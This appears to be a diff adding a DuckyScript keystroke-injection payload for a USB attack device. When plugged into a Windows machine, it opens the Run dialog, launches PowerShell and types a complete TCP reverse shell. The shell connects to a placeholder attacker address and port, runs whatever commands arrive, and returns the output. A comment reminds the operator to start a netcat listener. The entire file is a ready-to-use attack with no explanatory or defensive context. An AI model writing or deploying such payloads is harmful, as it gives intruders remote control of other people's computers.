@@ -1,0 +1,35 @@
+REM Remember nc -lvnp PORT
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 1000
+STRING $client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP', 'ATTACKER_PORT'); 
+ENTER
+DELAY 500
+STRING $stream = $client.GetStream(); 
+ENTER
+DELAY 500
+STRING [byte[]]$bytes = 0..65535|%{0}; 
+ENTER
+DELAY 500
+STRING while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) { 
+ENTER
+DELAY 500
+STRING $data = (New-Object Text.ASCIIEncoding).GetString($bytes, 0, $i); 
+ENTER
+DELAY 500
+STRING $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String); 
+ENTER
+DELAY 500
+STRING $sendback2 = $sendback + "PS " + (pwd).Path + "> "; 
+ENTER
+DELAY 500
+STRING $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); 
+ENTER
+DELAY 500
+STRING $stream.Write($sendbyte, 0, $sendbyte.Length); 
+ENTER
+DELAY 500
+STRING $stream.Flush() }
+ENTER
